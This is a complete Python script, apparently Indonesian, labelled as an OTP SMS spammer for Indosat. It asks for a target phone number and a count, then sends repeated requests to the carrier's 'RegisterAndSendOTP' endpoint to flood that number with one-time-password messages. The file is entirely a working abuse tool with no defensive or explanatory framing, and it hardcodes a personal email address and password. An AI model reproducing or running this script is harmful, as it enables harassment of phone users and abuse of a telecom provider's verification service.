# Coded by Yutix

import time, json, os
import requests as req
from bs4 import BeautifulSoup as bs

red = '\033[91m'
green = '\033[92m'
yellow = '\033[93m'
purple = '\033[95m'
cyan = '\033[96m'
white = '\033[37m'
off = '\033[m'

def send(n,o):
	url = "https://nadaku.indosatooredoo.com/doLogin?action=RegisterAndSendOTP&request_locale=ar"
	dat = { "loginMsisdn":n,"password":"Yvtx1997","confirmPassword":"Yvtx1997","name":"Yutix","email":"yutix404@gmail.com","catId":"567","isRobot":"1" }
	raw = req.post(url,data=dat).text
	res = json.loads(raw)["hasError"]
	if res == False:
		print(f"  {white}[{green}SENT{white}] Pengiriman ke {yellow}{o}")
	else:
		print(f"  {white}[{red}FAIL{white}] Pengiriman ke {yellow}{o}")

def main():
	os.system('clear')
	print(f'{white}\n  Spam Otp SMS Khusus INDOSAT \n{cyan} __  __   __  __   ______   __   __  __    \n{purple}/{cyan}\ \_\ \ {purple}/{cyan}\ \{purple}/{cyan}\ \ {purple}/{cyan}\__  _\ {purple}/{cyan}\ \ {purple}/{cyan}\_\_\_\   \n{purple}\ {cyan}\____ \{purple}\ {cyan}\ \_\ \{purple}\/_/{cyan}\ \{purple}/ \ {cyan}\ \{purple}\/_/{cyan}\_\{purple}/{cyan}_  \n{purple} \/{cyan}\_____\{purple}\ {cyan}\_____\ {purple} \ {cyan}\_\  {purple}\ {cyan}\_\{purple} /{cyan}\_\{purple}/{cyan}\_\{purple} \n  \/_____/ \/_____/   \/_/   \/_/ \/_/\/_/ \n')
	target = input(f'  {white}Target: {cyan}')
	max = input(f'  {white}Jumlah: {cyan}')
	print()
	for i in range(int(max)):
		time.sleep(0.7)
		send(target,i+1)
	print(f"\n  {white}Selesai.")

if __name__=='__main__':
	main()